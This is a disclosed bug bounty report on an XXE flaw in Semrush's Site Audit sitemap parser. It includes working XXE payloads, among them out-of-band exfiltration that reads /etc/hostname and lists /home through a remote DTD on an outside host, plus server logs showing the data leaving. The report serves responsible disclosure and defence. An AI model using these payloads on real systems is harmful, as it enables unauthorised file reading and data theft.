# XXE in Site Audit function exposing file and directory contents

## Report Details
- **Report ID**: 312543
- **URL**: https://hackerone.com/reports/312543
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-02-05T15:10:15.336Z
- **Disclosed**: 2018-03-13T14:24:37.574Z

## Reporter
- **Username**: ajxchapman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
**Summary:** 
The Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.

**Description:** 
The Site Audit function spiders a given website and performs analysis on the discovered pages. In order to improve website spidering the URL of a `sitemap.xml` file can be provided. If provided, the `sitemap.xml` file will be downloaded and processed by a Java XML processor.

The Java xml processor used is vulnerable to XXE attacks. By providing an external document type declaration (DTD) the XML processor can be coerced into processing external entities, for example:

**sitemap.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://xxe.webhooks.pw/text.txt" >]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```
Will cause the XML processor to process the external entity at http://xxe.webhooks.pw/text.txt:
```
"███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144"
```

This issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.

## Browsers Verified In:

* Firefox 58.0.1 (64-bit)
* Google Chrome 63.0.3239.132 (64-bit)

## Steps To Reproduce:

  1. Create a new project with the domain hosting the malicious `sitemap.xml` file, e.g. `semrush.webhooks.pw`
  2. Set up a new "Site Audit"
  3. Within "Site Audit Settings" change "Crawl Source" to "Enter sitemap URL" and add the url of the malicious `sitemap.xml` file. An example `sitemap.xml`, e.g. http://static.webhooks.pw/files/semrush_sitemap.xml.
  4. Start the "Site Audit"
  5. The "Site Audit" background process will then kick off, download the provided sitemap.xml file and process it, triggering the XXE vulnerability.

See the attached screen capture for an example of exploiting this issue. Note, this screen capture is approximately 1 minute long.

## Supporting Material/References:
### File reading
**sitemap.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///etc/hostname">
 <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```
**combine.dtd**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY xxe "%goodies;">
```

**Output:**
```
"46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)"
---

Decoded:
███████
```

### Directory listing
**sitemap.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///home/">
 <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```
**combine.dtd**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY xxe "%goodies;">
```

**Output:**
```
"46.229.173.66" - - [05/Feb/2018:14:39:35 +0000] "GET /resp/██████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)"
---

Decoded:
██████████
█████
█████
cdh
█████████
██████
███████
█████
█████████
██████████
███
████████
lost found
███████
█████████
█████████
```

## Impact

This issue could be abused to identify and list the contents of sensitive files on the Semrush server which implements the Site Audit functionality.

## Attachments
- semrush_xxe3.gif
